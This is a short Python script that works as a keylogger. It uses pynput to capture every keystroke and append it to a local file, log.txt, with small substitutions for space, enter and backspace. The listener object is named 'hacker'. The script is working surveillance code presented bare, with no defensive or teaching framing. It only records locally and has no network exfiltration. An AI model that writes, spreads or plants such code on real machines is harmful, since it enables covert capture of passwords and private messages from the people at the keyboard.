from pynput import keyboard

def on_press(key):
	key = str(key)
	key = key.replace("'","")
	if key == "Key.esc":
		return False   				#raise SystemExit(0) 
	if key == "Key.space":
		key = " "
	if key == "Key.enter":
		key = "/n"	
	if key == "Key.backspace":
		key = "xoa"
	with open("log.txt","a") as file:
		file.write(key)


with keyboard.Listener(on_press=on_press) as hacker:
	hacker.join()

# listener = keyboard.Listener(
#     on_press=on_press,
#    	on_release=on_release)
# listener.start()

